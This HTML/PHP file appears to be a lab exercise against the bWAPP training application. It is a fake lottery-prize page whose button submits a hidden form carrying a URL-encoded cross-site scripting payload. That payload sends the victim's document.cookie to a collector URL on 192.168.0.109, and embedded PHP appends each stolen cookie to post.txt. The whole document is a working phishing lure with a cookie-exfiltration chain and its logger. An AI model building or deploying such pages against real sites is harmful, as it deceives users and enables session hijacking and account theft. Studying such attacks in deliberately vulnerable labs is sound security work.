<html>
<head>
<title>Lottery</title>
</head>
<body>
<h1 align="center">CONGRATULATIONS!!!</h1>
<h1 align="center">YOU WON!!!</h1>
<form action="http://192.168.0.109:8/bWAPP_latest/bWAPP/xss_post.php" method="POST">
        <input type="hidden" id="firstname" name="firstname" value="%3Cscript%3Ewindow.open%28%22http%3A%2F%2F192.168.0.109:8%2Fhack_xss%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E">
        <input type="hidden" id="lastname" name="lastname" value="Do">
        <button type="submit" name="form" value="submit">Click this to see your prize</button>  

    </form>
<?php
setcookie('security_level', 0);
if(isset($_GET[ 'cookie' ])){
	$cookie =  $_GET[ 'cookie' ];
	if (file_exists('post.txt')) {
		$fp = fopen('post.txt', 'a');
		$text = $cookie . PHP_EOL;
		fwrite($fp, $text);
		fclose($fp);
	}
}
?>
</body>
</html>
